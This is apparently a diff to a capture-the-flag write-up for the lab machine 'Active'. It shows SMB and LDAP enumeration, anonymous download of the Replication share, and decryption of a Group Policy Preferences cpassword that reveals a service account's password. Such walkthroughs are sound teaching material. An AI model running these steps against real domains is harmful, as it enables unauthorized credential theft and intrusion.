@@ -44,7 +44,18 @@ I need a way of enumerating usernames:
 └─# rpcclient 10.10.10.100 -U%
 rpcclient $> enumdomusers
 Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
-I move to try and enumerate smb shares:
+I move on to LDAP : Ports 389, 636, 3268, 3269
+└─# ldapsearch -h 10.10.10.100 -x -s base namingcontexts
+#
+dn:
+namingContexts: DC=active,DC=htb
+namingContexts: CN=Configuration,DC=active,DC=htb
+namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+This returns the info that we already know.
+
+I move on to enumerate smb shares:
 └─# smbclient -L 10.10.10.100
 Enter WORKGROUP\root's password: 
 Anonymous login successful
@@ -59,16 +70,31 @@ Anonymous login successful
 	SYSVOL          Disk      Logon server share 
 	Users           Disk      
 SMB1 disabled -- no workgroup available
-I cannot be able to access any shares here.
-I move on to LDAP : Ports 389, 636, 3268, 3269
-└─# ldapsearch -h 10.10.10.100 -x -s base namingcontexts
-#
-dn:
-namingContexts: DC=active,DC=htb
-namingContexts: CN=Configuration,DC=active,DC=htb
-namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
-namingContexts: DC=DomainDnsZones,DC=active,DC=htb
-namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+└─# smbclient -N \\\\10.10.10.100\\Replication
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  active.htb                          D        0  Sat Jul 21 13:37:44 2018
+smb: \> cd active.htb
+smb: \active.htb\> dir
+  DfsrPrivate                       DHS        0  Sat Jul 21 13:37:44 2018
+  Policies                            D        0  Sat Jul 21 13:37:44 2018
+  scripts                             D        0  Wed Jul 18 21:48:57 2018
+
+smb: \active.htb\> recurse ON
+smb: \active.htb\> prompt OFF
+smb: \active.htb\> mget *
+
+And I searched around on the local files to find groups.xml
+└─# cat MACHINE/Preferences/Groups/Groups.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+
+└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18
+
+Credentials as SVC_TGS : GPPstillStandingStrong2k18
 
 
 Reference:
